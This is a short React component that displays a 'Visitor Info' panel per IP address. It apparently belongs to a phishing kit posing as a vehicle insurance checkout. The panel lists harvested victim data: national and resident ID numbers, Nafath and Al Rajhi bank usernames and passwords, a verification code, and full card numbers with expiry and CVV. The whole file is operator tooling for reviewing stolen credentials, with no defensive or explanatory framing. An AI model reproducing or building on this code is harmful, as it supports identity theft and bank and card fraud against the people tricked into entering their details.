import React from "react";
import { Modal, Button, FormControl } from "react-bootstrap";

export default function InfoModal({ ip, user, onClose }) {
  const rows = [
    ["Full Name", user.FullName],
    ["Phone Number", user.PhoneNumber],
    ["Buyer ID", user.BuyerIDnumber],
    ["Resident ID", user.IDorResidenceNumber],
    ["Contract Type", user.TypeOfInsuranceContract],
    ["Start Date", user.InsuranceStartDate],
    ["Purpose", user.PurposeOfUse],
    ["Est. Value", user.EstimatedValue],
    ["Year", user.ManufactureYear],
    ["Repair Loc", user.RepairLocation],
    ["3rd-party Co", user.companyName],
    ["3rd-party Base", user.basePrice],
    ["3rd-party Total", user.totalPrice],
    ["Mada", user.mada?.toString()],
    ["Visa/MC", user.visa_mastarcard?.toString()],
    ["ApplePay", user.applepay?.toString()],
    ["Billing Total", user.totalPrice],
    ["Nafad User", user.username],
    ["Nafad Pass", user.password],
    ["Rajhi User", user.username],
    ["Rajhi Pass", user.password],
    ["Basmah", user.code],
    ["Card Holder", user.cardHolderName],
    ["Card #", user.cardNumber],
    ["Expiry", user.expirationDate],
    ["CVV", user.cvv],
  ];

  return (
    <Modal show onHide={onClose} size="lg" centered>
      <Modal.Header closeButton>
        <Modal.Title>Visitor Info — {ip}</Modal.Title>
      </Modal.Header>
      <Modal.Body style={{ direction: "ltr" }}>
        {rows.map(([label, val]) => (
          <p key={label}>
            <strong>{label}:</strong> {val ?? "—"}
          </p>
        ))}
      </Modal.Body>
      <Modal.Footer>
        <Button variant="secondary" onClick={onClose}>
          Close
        </Button>
      </Modal.Footer>
    </Modal>
  );
}
